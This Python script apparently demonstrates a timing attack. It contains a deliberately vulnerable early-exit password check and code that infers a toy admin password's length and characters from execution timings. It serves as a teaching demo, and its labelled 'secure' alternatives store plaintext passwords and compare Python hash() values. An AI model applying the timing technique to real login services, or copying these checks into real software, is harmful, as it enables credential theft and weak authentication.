import itertools
import random
import string
import timeit

import numpy as np

allowed_chars = string.ascii_lowercase + " "
password_database = {"admin": "reallysecurepassword"}


def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))


# This check password is technically vulnerable but in practice it's hard to attack because the computation time is so short
def check_password(user, guess):
    actual = password_database[user]
    return actual == guess


# This check password is vulnerable to timing attacks in practice
def check_password_insecure(user, guess):
    actual = password_database[user]
    if len(guess) != len(actual):
        return False

    for i in range(len(actual)):
        if guess[i] != actual[i]:
            return False
    return True


def check_password_secure(user, guess):
    actual = password_database[user]
    correct_password = True
    # Trim or fill up guess to the length of the actual password
    guess = guess[:len(actual)] + " " * (len(actual) - len(guess))
    for i in range(len(actual)):
        if guess[i] != actual[i]:
            correct_password = False
    return correct_password


def check_password_secure_2(user, guess):
    actual = password_database[user]
    # Hash the guess and the actual password
    guess_hash = hash(guess)
    actual_hash = hash(actual)
    # Compare the hashes
    return guess_hash == actual_hash


def crack_length(user, max_len=32, verbose=False) -> int:
    trials = 2000
    times = np.empty(max_len)
    for i in range(max_len):
        i_time = timeit.repeat(stmt='check_password_insecure(user, x)',
                               setup=f'user={user!r};x=random_str({i!r})',
                               globals=globals(),
                               number=trials,
                               repeat=10)
        times[i] = min(i_time)

    if verbose:
        most_likely_n = np.argsort(times)[::-1][:5]
        print(most_likely_n, times[most_likely_n] / times[most_likely_n[0]])

    most_likely = int(np.argmax(times))
    return most_likely


def crack_password(user, length, verbose=False):
    guess = random_str(length)
    counter = itertools.count()
    trials = 1000
    while True:
        i = next(counter) % length
        for c in allowed_chars:
            alt = guess[:i] + c + guess[i + 1:]

            alt_time = timeit.repeat(stmt='check_password_insecure(user, x)',
                                     setup=f'user={user!r};x={alt!r}',
                                     globals=globals(),
                                     number=trials,
                                     repeat=10)
            guess_time = timeit.repeat(stmt='check_password_insecure(user, x)',
                                       setup=f'user={user!r};x={guess!r}',
                                       globals=globals(),
                                       number=trials,
                                       repeat=10)

            if check_password_insecure(user, alt):
                return alt

            if min(alt_time) > min(guess_time):
                guess = alt
                if verbose:
                    print(guess)


if __name__ == '__main__':
    user = "admin"
    print(f"Attacking user {user}")
    length = crack_length(user, verbose=True)
    print(f"Password length is most likely {length}")
    input("Press enter to start cracking")
    password = crack_password(user, length, verbose=True)
    print(f"Password cracked:'{password}'")
